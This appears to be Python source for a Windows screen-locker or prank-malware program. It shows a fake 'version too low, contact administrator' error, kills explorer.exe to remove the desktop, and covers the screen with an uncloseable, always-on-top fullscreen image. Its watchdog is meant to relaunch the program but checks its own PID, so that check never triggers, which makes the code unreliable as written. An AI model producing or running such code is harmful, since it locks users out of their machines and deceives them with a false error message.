import sys # 处理路径
from time import sleep # 延时
from tkinter import Label, Tk # 创建窗口
from PIL import Image, ImageTk # 图片处理
from ctypes import windll # 调用系统API
from psutil import pid_exists as pidExists # 进程管理
from os import path, system, getpid, execl  # 文件操作


# 打开提示窗口
def errorWindow():
    try: windll.user32.MessageBoxW(None, "程序版本过低，请联系管理员更新！", "错误", 0x10)
    except: pass


# 结束桌面程序
def endDesktopProgram():
    try: system("taskkill /f /im explorer.exe") # 结束桌面程序
    except: pass


# 创建全屏窗口
def fullScreenWindow():
    try:
        root = Tk() # 创建窗口
        root.attributes('-fullscreen', True)  # 设置窗口为全屏
        root.attributes('-topmost', True)  # 窗口置顶显示
        root.protocol("WM_DELETE_WINDOW", lambda: None) # 禁止关闭窗口
        img = Image.open(path.join(sys._MEIPASS, "logo.jpg") if getattr(sys, 'frozen', False) else "static/image/logo.jpg") # 打开图片
        photo = ImageTk.PhotoImage(img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)) # 缩放图片
        label = Label(root, image=photo) # 创建标签
        label.pack(fill='both', expand=True) # 填充窗口
        root.mainloop() # 运行窗口 
    except: pass


# 监控进程，如果进程不存在则重启
def monitorProcess():
    try:
        pid = getpid()  # 获取当前进程pid
        while True:
            sleep(1)  # 延时
            if not pidExists(pid): execl(sys.executable, sys.executable, *sys.argv)  # 重启进程
    except: pass
 
